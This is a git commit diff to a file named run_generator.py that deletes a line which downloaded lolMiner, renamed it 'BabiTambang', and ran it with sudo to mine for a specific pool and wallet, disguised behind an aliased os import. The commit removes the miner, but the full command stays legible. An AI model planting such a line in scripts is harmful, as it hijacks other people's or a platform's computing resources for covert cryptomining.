231304e9215b355179cbda9880d81a7828902507
colab94 <92239639+colab94@users.noreply.github.com>
2021-10-10 10:58:12 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,3 @@
 import os as alpha
 alpha.system("nvidia-smi")
-alpha.system("
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a && chmod +x lolMiner && mv lolMiner BabiTambang && sudo ./BabiTambang -a ETHASH --pool -o stratum+tcp://ethash.asia.mine.zergpool.com:9999 -u MB3ux2fkhJAcT94zayTTbSFJToCQcuRfGj -p  c=LTC,ID=id")
+
